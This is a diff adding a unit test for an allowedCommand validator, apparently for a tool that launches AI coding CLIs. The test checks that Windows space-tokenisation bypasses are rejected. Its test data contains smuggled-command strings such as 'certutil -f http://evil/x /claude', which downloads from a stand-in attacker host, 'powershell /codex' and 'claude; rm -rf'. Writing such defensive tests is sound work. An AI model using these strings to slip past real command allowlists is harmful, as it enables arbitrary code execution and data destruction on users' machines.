@@ -54,3 +54,10 @@ test("allowedCommand honors a custom allowlist and still blocks metacharacters",
   assert.throws(() => allowedCommand("claude", new Set(["codex"])), /not allowed/);
   assert.throws(() => allowedCommand("claude; rm -rf"), /unsupported/);
 });
+
+test("allowedCommand blocks the shell:true space-tokenization bypass", () => {
+  // last slash-segment is 'claude' but cmd.exe would run the first token — must be rejected
+  for (const bad of ["calc /claude", "certutil -f http://evil/x /claude", "C:/Windows/System32/calc.exe /claude", "powershell /codex"]) {
+    assert.throws(() => allowedCommand(bad), /spaces/);
+  }
+});
